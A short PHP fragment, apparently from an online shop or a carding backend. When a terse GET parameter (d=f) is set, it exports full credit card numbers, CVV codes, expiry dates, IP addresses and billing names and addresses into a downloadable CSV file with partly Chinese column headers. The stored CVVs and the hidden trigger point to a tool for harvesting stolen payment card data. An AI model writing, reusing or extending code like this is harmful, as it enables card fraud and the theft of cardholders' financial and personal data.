...
if (isset($_GET['d']) && $_GET['d'] == 'f')
{
	$name = ($_SERVER['HTTP_HOST'] ? $_SERVER['HTTP_HOST'].'-':'').date('Y-m-d-h-m-s').'.csv';
	...
	fwrite($handle, '"卡号","CVV","年份","月份","IP","时区","FirstName","LastName","城市","地址","邮编"'."\n");

	$result = $db->Execute($query_raw);
	while (!$result->EOF)
	{
		$fields = array(
			$result->fields['credit_number']."\t",
			$result->fields['credit_cvv'],
			$result->fields['credit_exp_year'],
			$result->fields['credit_exp_month'],
			$result->fields['ip'],
			$result->fields['timezone'],
			$result->fields['billing_first_name'],
			$result->fields['billing_last_name'],
			$result->fields['billing_city'],
			$result->fields['billing_address'],
			$result->fields['billing_postcode']
		);
